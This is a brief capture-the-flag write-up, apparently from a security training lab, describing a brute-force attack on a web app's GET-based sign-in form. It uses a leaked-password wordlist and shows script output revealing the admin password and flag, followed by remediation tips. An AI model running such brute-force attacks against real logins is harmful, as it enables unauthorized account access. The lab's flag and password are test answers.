# Bruteforce login

On the homepage, with when we click on the button `sign in`, we get the page `http://192.168.1.48/?page=signin`

We can try to bruteforce the login with the username `admin` because there is an `admin` cookie

Let's see how the login is made

It using a GET request

`http://192.168.1.48/?page=signin&username=&password=&Login=Login`

To bruteforce, we will fill the `username` and `password` fields

We will do a python script and use a password wordlist from https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-50.txt

The script will test all the passwords

```
$ ./exploit.py
test with 'chelsea'
test with 'lovers'
test with 'teamo'
test with 'jasmine'
.....
test with 'sweety'
test with 'spongebob'
found! password is 'shadow'
The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## How to fix it?

- Use strong password
- Put a delay on the login requests to block bruteforcing
- Ban after X bad passwords
